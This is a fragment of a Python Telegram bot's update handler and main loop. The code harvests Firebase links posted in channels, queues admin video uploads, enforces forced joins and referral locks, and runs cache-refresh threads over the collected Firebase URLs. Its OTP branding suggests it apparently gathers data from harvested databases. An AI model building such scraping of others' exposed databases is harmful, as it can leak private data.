            if fchat in HARVEST_CHANS and is_adm(u["id"]):
                n = harvest_text((msg.get("text") or "") + "\n" + (msg.get("caption") or ""))
                send(cid, "🔗 <b>Harvested: %d</b> new firebase link(s) from channel." % n)
                return
            vid = msg.get("video")
            doc = msg.get("document")
            if doc and str(doc.get("mime_type", "")).startswith("video/"):
                vid = doc
            if vid and mode.get(uid) == "adm_video" and is_adm(u["id"]):
                q = state.setdefault(uid, {}).setdefault("vidq", [])
                q.append((vid.get("file_id"), vid.get("file_name") or ""))
                send(cid, f"{sec('📥', 'ǫᴜᴇᴜᴇᴅ')}\n{DIV}\n\n"
                          f"{emo('📱')} ᴠɪᴅᴇᴏ ʀᴇᴀᴅʏ — ǫᴜᴇᴜᴇ: <b>{len(q)}</b>\n"
                          f"{emo('💬')} ꜱᴇɴᴅ ᴍᴏʀᴇ ᴏʀ ᴛʏᴘᴇ <code>ᴅᴏɴᴇ</code> ᴛᴏ ᴜᴘʟᴏᴀᴅ ᴀʟʟ." + footer())
                return
            text = msg.get("text", "")
            if not text:
                return
            get_user(u["id"], u.get("username"), u.get("first_name"))
            is_start = text.startswith("/start")
            if not force_ok(u["id"]) and not is_start:
                force_card(cid, u)
                return
            if not unlocked(u["id"]) and not is_start:
                reflock_card(cid, u)
                return
            m = mode.get(uid)
            if isinstance(m, str) and (m in ("search", "addfb") or m.startswith("adm_")):
                mode[uid] = m
            handle_text(u, cid, text)
    except Exception:
        log.exception("process update")

def main():
    global BOT_UN, OFFS
    load()
    _load_adms()
    _load_nums()
    DATA.mkdir(exist_ok=True)
    if FBS_FILE.exists():
        try:
            extra = json.loads(FBS_FILE.read_text(encoding="utf-8"))
            with fb_list_lock:
                for x in extra:
                    if x not in GLOBAL_FB_LIST:
                        GLOBAL_FB_LIST.append(x)
        except Exception:
            pass
    if VIDS_FILE.exists():
        try:
            with _vlock:
                _vids.update(json.loads(VIDS_FILE.read_text(encoding="utf-8")))
        except Exception:
            pass
    r = api("getMe")
    if r and r.get("ok"):
        BOT_UN = r["result"].get("username", BOT_UN)
    log.info(f"starting @{BOT_UN} (💎 『𝗛𝗔𝗧𝗛𝗜𝗫𝗢𝗧𝗣』 🔥)")
    api("deleteWebhook", drop_pending_updates=True)
    with fb_list_lock:
        urls = list(GLOBAL_FB_LIST)
    threading.Thread(target=refresh_loop, daemon=True).start()
    threading.Thread(target=refresh_pool, args=(urls,), daemon=True).start()
    log.info("initial fb cache fill started")
    UPD_POOL = ThreadPoolExecutor(32, thread_name_prefix="upd")
    log.info("update workers: 32 (fixed pool)")
    while True:
        for upd in get_updates():
            OFFS = upd["update_id"] + 1
            try:
                UPD_POOL.submit(process, upd)
            except Exception:
                log.exception("submit update")

if __name__ == "__main__":
    main()
